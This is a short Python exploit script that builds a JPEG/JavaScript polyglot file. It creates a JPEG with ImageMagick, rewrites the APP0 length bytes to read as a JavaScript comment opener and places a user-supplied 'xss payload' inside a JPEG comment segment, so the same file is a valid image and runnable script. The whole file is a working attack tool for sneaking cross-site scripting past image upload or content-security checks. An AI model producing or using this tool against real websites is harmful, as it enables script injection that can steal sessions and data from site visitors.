#!/usr/bin/python3

import argparse
import subprocess

def exploit(payload: str, imagesize: str, output: str) -> None:
    # generate base jpeg image
    result = subprocess.run(['convert', '-size', imagesize, 'xc:white', 'JPG:-'], capture_output=True, check=True)
    original_data = result.stdout

    # extract app0 length
    original_app0_length = int.from_bytes(original_data[5:6])

    # 0x2f2a is the length of app0 including itself. 0x2f2a is /* in ASCII and 12074 in Decimal. 0x00 pad to extra part.
    app0 = b'\x2f\x2a' + \
        original_data[6:original_app0_length-2+6] + \
        b'\x00'*(0x2f2a-original_app0_length)
    assert len(app0) == 0x2f2a, f"{len(app0)=}"

    # add comment out before and after payload not to execute JPEG byte data as JavaScript code
    payload = f"*/={payload}/*"

    comment_length = 2+len(payload)

    # 0xfffe is text comment marker
    comment = b'\xff\xfe' + comment_length.to_bytes(2) + payload.encode()

    # *0x2a2f2f2f is */// in ASCII and 0xffd9 is JPEG End of Image marker
    end = b'\x2a\x2f\x2f\x2f\xff\xd9'

    payload = original_data[:4] + app0 + comment + original_data[4+original_app0_length:-len(end)] + end

    with open(output, 'wb') as f:
        f.write(payload)

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--payload', help="xss payload", required=True)
    parser.add_argument('-s', '--imagesize', help="image size for convert command", required=True)
    parser.add_argument('-o', '--output', help="output filename", required=True)
    args = parser.parse_args()

    exploit(args.payload, args.imagesize, args.output)

if __name__ == "__main__":
    main()
